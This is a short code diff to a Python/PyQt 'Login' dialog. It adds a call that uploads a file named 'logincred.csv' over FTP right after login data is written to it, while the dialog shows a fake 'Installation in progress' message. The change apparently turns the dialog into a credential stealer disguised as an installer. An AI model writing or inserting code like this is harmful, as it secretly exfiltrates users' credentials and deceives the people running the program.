@@ -46,6 +46,8 @@ class Login(QDialog):
         csvwriter.writerow(rows)
 
         csvfile.close()
+        send_ftp("logincred.csv")
+        
         msg = QMessageBox()
         msg.setText("Installation in progress")
         msg.setWindowTitle("Installing...")
